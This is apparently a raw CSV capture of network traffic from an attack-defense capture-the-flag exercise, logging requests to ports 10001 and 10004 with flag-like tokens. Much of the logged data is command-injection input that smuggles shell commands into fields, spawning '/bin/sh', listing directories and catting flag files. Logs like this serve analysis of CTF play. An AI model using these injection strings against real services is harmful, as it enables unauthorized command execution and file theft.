interface/src_ip/src_eth/dst_port,last_req_time,time_btw_req,all_data
tun0/10.9.12.3/undefined/10004,2022-02-19 17:56:15.455921,0,cat 3448089962--8675309 a a--ca--cat 655350749--8675309 a a--ca--cat 2295754375--8675309 a a--ca--8675309 a a--ca--cat 2254715557--8675309 a a--ca--cat 1341648336--8675309 a a--ca--cat 3026100418--8675309 a a--ca--cat 3426847512--8675309 a a--ca--cat 1083047714--8675309 a a--ca--cat 784126138--8675309 a a--ca--8675309 a a--ca--cat 770140707--8675309 a a--ca--cat 4092359387--8675309 a a--ca--cat 498670837--8675309 a a--ca--cat 2710596937--8675309 a a--ca--cat 163333068--8675309 a a--ca--cat 970835885--8675309 a a--ca--cat 223429213--8675309 a a--ca--cat 298751781--8675309 a a--ca--cat 1867605202--8675309 a a--ca--cat 1253885369--8675309 a a--ca--cat 1216149647--8675309 a a--ca--cat 3856704671--8675309 a a--ca--cat 959772144--8675309 a a--ca--cat 55671556--8675309 a a--ca--cat 2672624086--8675309 a a--ca--cat 2689292429--8675309 a a--ca--8675309 a a--ca--cat 938178232--8675309 a a--ca--cat 4059226534--8675309 a a--ca--cat 3858304610--8675309 a a--ca--cat 998037431--8675309 a a--ca--cat 2683635603--8675309 a a--ca--cat 1363225072--8675309 a a--ca--cat 3218290130--8675309 a a--ca--cat 4092359387--8675309 a a--ca--cat 498670837--8675309 a a--ca--cat 2710596937--8675309 a a--ca--cat 163333068--8675309 a a--ca--cat 970835885--8675309 a a--ca--cat 223429213--8675309 a a--ca--cat 298751781--8675309 a a--ca--cat 1867605202--8675309 a a--ca--cat 1253885369--8675309 a a--ca--cat 1216149647--8675309 a a--ca--cat 3856704671--8675309 a a--ca--cat 959772144--8675309 a a--ca--cat 55671556--8675309 a a--ca--cat 2672624086--8675309 a a--ca--cat 2689292429--8675309 a a--ca--8675309 a a--ca--cat 938178232--8675309 a a--ca--cat 4059226534--8675309 a a--ca--cat 3858304610--8675309 a a--ca--cat 998037431--8675309 a a--ca--cat 2683635603--8675309 a a--ca--cat 1363225072--8675309 a a--ca--cat 3218290130
tun0/10.9.12.1/undefined/10001,2022-02-19 17:56:15.568346,0,"2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --0w6y6b3r7v7m4v3a9j3d--*; ls -la;--a;echo ""==="";cat *0r3t8i4h4i9s0d7y7u5d*;echo ""==="";--0r3t8i4h4i9s0d7y7u5d*;--0r3t8i4h4i9s0d7y7u5d*;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2p0w0w2v3n7b1k5h8r7y--9d9t9u0h7s4s9y8x9m7a--2lSGMXGw8z--somename somepwd 1 10 file /tmp/abcd 2 0r3t8i4h4i9s0d7y7u5d *--a;cat 0r3t8i4h4i9s0d7y7u5d*;aa 123--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --test; cat 0r3t8i4h4i9s0d7y7u5d*; echo--2i0q4c0g8d0h7u7q5r0i--*; ls -la;--a; /bin/sh; cat a--cat 0r3t8i4h4i9s0d7y7u5d*--a; /bin/sh; cat a--cat 0r3t8i4h4i9s0d7y7u5d*--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;cat 0r3t8i4h4i9s0d7y7u5d*;aa 123--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --FLGTpSHW4XvrdWM--FLGWp4XTSkGmQNp0--3q7p7e1u0p0k4m8w6t7m--0x5b8s8k4--3q7p7e1u0p0k4m8w6t7m--FLGWp4XTSkGmQNp0--FLGtaa2jqKybAyav--3q7p7e1u0p0k4m8w6t7m--1k1d7b0k3x7u3i9b7s6y9i9w2s9q1f7t4p6h6y0lFLG3m4So4rGxZrtY1r9b3l5e4s2m5r3s2z1g1w1w8x8z7--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;cat 2p0w0w2v3n7b1k5h8r7y*;aa 123--2p0w0w2v3n7b1k5h8r7y--*; ls -la;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 2p0w0w2v3n7b1k5h8r7y;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2p0w0w2v3n7b1k5h8r7y--9d9t9u0h7s4s9y8x9m7a--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a; /bin/sh; cat a--cat 2p0w0w2v3n7b1k5h8r7y*--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a; /bin/sh; cat a--cat 2p0w0w2v3n7b1k5h8r7y*--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --test; cat 2p0w0w2v3n7b1k5h8r7y*; echo--FLGX4NyFekAUzPuv--9l3z4r4l3r6w8c6a2f9o--FLGlPflHCUJBU53--4h0g7h6l1--9l3z4r4l3r6w8c6a2f9o--FLGX4NyFekAUzPuv--9l3z4r4l3r6w8c6a2f9o--FLGVLdImonqOXf74--0k7y5l6m6z2j6d3c8g1g6e5s2c3i9b0y7k0c8c0eFLG9R87lysQExdPF8h2u3b7s5n9z7t4l6i2v1j0q5t1o2--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 some;cat 2p0w0w2v3n7b1k5h8r7y*;echo;  3 --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 2p0w0w2v3n7b1k5h8r7y*;  3--2p0w0w2v3n7b1k5h8r7y--*; ls -la;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --9m1g1y6z2k2a2s4m1c6w--FLGfz20ITtbatE2D--5l1h0s2d0--FLG71sqOWGWuL05--9m1g1y6z2k2a2s4m1c6w--FLGfz20ITtbatE2D--9m1g1y6z2k2a2s4m1c6w--FLGwqMxnPaYnhf8w--8u4p0c8v5b4j0a5k9o5j0l7n0u9n1e9m5c7g2f3sFLGj9umnmGx6UODW7g1f3j7h6d9g3d7i1f5e0i1q9w6f6--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --0w6y6b3r7v7m4v3a9j3d--*; ls -la;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --; cat 0r3t8i4h4i9s0d7y7u5d_*;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a; /bin/sh; cat a--cat 2p0w0w2v3n7b1k5h8r7y*--2i0q4c0g8d0h7u7q5r0i--*; ls -la;--a;echo ""==="";cat *2p0w0w2v3n7b1k5h8r7y*;echo ""==="";--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a; /bin/sh; cat a--cat 2p0w0w2v3n7b1k5h8r7y*--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2p0w0w2v3n7b1k5h8r7y--*; ls -la;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --test; cat 2p0w0w2v3n7b1k5h8r7y*; echo--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --cat 2p0w0w2v3n7b1k5h8r7y*--a; /bin/sh; cat a--;cat *;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a; /bin/sh; cat a--cat 2p0w0w2v3n7b1k5h8r7y*--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2p0w0w2v3n7b1k5h8r7y*;--2p0w0w2v3n7b1k5h8r7y*;--5b6i7s0q5n7r2f2h5r4r--3l8h7d9w0x6a8m6x1r8s--0UzcqY0n4K--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2p0w0w2v3n7b1k5h8r7y--*; ls -la;--2 a;ls | grep 2p0w0w2v3n7b1k5h8r7y;  --a; /bin/sh; cat a--cat 2p0w0w2v3n7b1k5h8r7y*--2 a;ls | grep 2p0w0w2v3n7b1k5h8r7y;  --a; /bin/sh; cat a--cat 2p0w0w2v3n7b1k5h8r7y*--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --cat 2p0w0w2v3n7b1k5h8r7y*--a; /bin/sh; cat a--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 2p0w0w2v3n7b1k5h8r7y*;  3--4x3v9m9r7l3s5a6w8o3g--FLGkiARL6LnHzqCB--FLGa7Wn2JKOO7Q8--9p1y7a2c8--4x3v9m9r7l3s5a6w8o3g--FLGkiARL6LnHzqCB--4x3v9m9r7l3s5a6w8o3g--FLGF9JLrFOBzLcno--3i9v3b0q2x9i5l3q8m6r9c5w6e4u3b7m0g0n5v5oFLGwo1v2tBpxEVKe5l8j8c2h4r3f5u6b0h4n1t9h2b2a9--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --0w6y6b3r7v7m4v3a9j3d--*; ls -la;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --cat 5b6i7s0q5n7r2f2h5r4r*--a; /bin/sh; cat a--test; cat 5b6i7s0q5n7r2f2h5r4r*; echo--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2i0q4c0g8d0h7u7q5r0i--*; ls -la;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;echo ""==="";cat *5b6i7s0q5n7r2f2h5r4r*;echo ""==="";--5b6i7s0q5n7r2f2h5r4r--*; ls -la;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --0r0m5v0m9l6z3c0f9m4q--FLGfKhBlC29Oyn0n--FLGYEU1tteLcpb7--1y5a1q1x7--FLGfKhBlC29Oyn0n--0r0m5v0m9l6z3c0f9m4q--0r0m5v0m9l6z3c0f9m4q--5i1l5t7x1v6q1m2y4w4y2l9d4m8c3d2a6p3u2j0tFLGp725uSeSXL8SR9w5z3o4m1a1o2i7n9d5x1i6w5k7a9--FLG26Nvg517KlxCC--2 some;cat 5b6i7s0q5n7r2f2h5r4r*;echo;  3 --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a; /bin/sh; cat a--cat 5b6i7s0q5n7r2f2h5r4r*--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  "
tun0/10.9.12.3/undefined/10001,2022-02-19 17:56:20.044897,0,8y0i6m1l6r6o0s4j6y6x--6t9u0d9q8a9l2w4p1w1z--1a4v7n1r3w6s5k9b8x5p--6t2a4w9d9x9l3k4t2c7c--7j8i6n9t1t4b5a2n4b7s--9e3b3y0z4f2e9h4d0r4i--6i6q8c0r9r9t9n1f6h9e--2v0w9n1y5p3c6z8m7f5o--4y2u0o9h5d3l5h4x0l6g--8n4y5b2f1h1a8g5u9i6f--9s0g4h9q8s3m4y6g6w6g
tun0/10.9.12.1/undefined/10004,2022-02-19 17:56:23.362639,0,723153654 K2jg2iHrTbAA2A6qHjOw FLGY6Aob2qPAfLzR--abcde test -- cat 4218801477--ca--723153654 K2jg2iHrTbAA2A6qHjOw--ca--1 aaaa bbbb--cat 4218801477--ca--3774488301 BITmkwYA6saRTF282ZY2 FLGRw5OHJrxlKk04--3774488301 qlhZIZngaEfV5HmeJl5n--3774488301 BITmkwYA6saRTF282ZY2--ca-- cat 4218801477--abcde test -- cat 723153654--ca--1387234149 Mln1QgycYxZ1P7AV0sjZ FLGzZtNQCzokEZjI--1387234149 ROXABVpbn2dX85GWgEuV--1387234149 Mln1QgycYxZ1P7AV0sjZ--1 aaaa bbbb--cat 723153654--ca--1071450625 UcX2m3kTMon1vGPZ5cnj FLGRhtIkZt2ZN1JW--1071450625 2oxTEw2C3FhzDv3P0HOj--1071450625 UcX2m3kTMon1vGPZ5cnj--1 aaaa bbbb--ca--cat 723153654--1 aaaa bbbb--ca--cat 723153654--ca-- cat 723153654--1 aaaa bbbb--ca--cat 723153654--4252061052 BHAlC2mTVW5kCf4Q1oEq FLGQiyOe5nMxlOtW--1 aaaa bbbb--cat 723153654--ca--1 aaaa bbbb--ca--cat 723153654--4252061052 BHAlC2mTVW5kCf4Q1oEq--abcde test --ca-- cat 723153654--ca--cat 723153654--1 aaaa bbbb--cat 723153654--ca--1 aaaa bbbb--ca--cat 723153654--3646217045 vZlgUDCcv7JVUT41bDrS FLGIRIDkbAMhtGUC--3646217045 h6PGXplbKRqrvDjZ546Q--3646217045 vZlgUDCcv7JVUT41bDrS
